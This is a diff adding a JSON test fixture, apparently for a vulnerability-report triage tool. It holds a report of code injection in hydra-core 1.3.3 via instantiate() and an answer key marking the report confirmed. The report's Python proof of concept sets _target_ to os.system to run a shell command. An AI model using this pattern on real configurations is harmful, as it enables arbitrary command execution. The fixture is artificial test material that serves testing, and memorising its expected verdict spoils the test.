@@ -1,0 +1,18 @@
+{
+  "report": {
+    "report_id": "hydra-core-affected",
+    "package": "hydra-core",
+    "affected_version": "1.3.3",
+    "title": "code injection via hydra.utils.instantiate() resolving an attacker-controlled _target_ in hydra-core",
+    "body": "I found a code injection via hydra.utils.instantiate() resolving an attacker-controlled _target_ vulnerability in hydra-core 1.3.3.\n\nCode injection via hydra.utils.instantiate() resolving an attacker-controlled _target_.\n\nTracked as CVE-2026-68508 (GHSA-2cp2-2r3c-7p7r).\n\nProof of concept:\n\n```python\nimport os, tempfile\nmarker = os.path.join(tempfile.gettempdir(), \"hydra_pwned\")\nif os.path.exists(marker): os.remove(marker)\nfrom hydra.utils import instantiate\nfrom omegaconf import OmegaConf\ncfg = OmegaConf.create({\"_target_\": \"os.system\", \"_args_\": [\"touch %s\" % marker]})\ntry:\n    instantiate(cfg)\nexcept Exception as e:\n    print(\"instantiate raised:\", type(e).__name__)\nprint(\"SLOPGATE:REPRODUCED\" if os.path.exists(marker) else \"SLOPGATE:NOT_REPRODUCED\")\n```\n",
+    "reporter": "researcher"
+  },
+  "ground_truth": {
+    "expected_verdict": "confirmed",
+    "package": "hydra-core",
+    "fixed_version": "1.3.4",
+    "cve": "CVE-2026-68508",
+    "source": "GHSA/NVD",
+    "note": "real vuln, affected version"
+  }
+}
